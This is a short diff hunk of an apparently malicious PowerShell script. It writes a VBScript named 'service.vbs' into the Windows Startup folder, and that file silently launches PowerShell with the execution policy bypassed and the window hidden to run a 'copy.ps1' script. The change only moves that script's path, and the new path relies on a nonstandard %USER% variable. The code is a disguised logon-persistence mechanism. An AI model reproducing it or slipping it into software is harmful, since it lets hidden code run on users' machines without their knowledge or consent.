@@ -406,7 +406,7 @@ if ($newScriptPath.Length -lt 100){
     }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\PowerShell\copy.ps1""", 0, True
+objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""C:\Users\%USER%\Desktop\copy.ps1""", 0, True
 '@
 $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
 $tobat | Out-File -FilePath $pth -Force
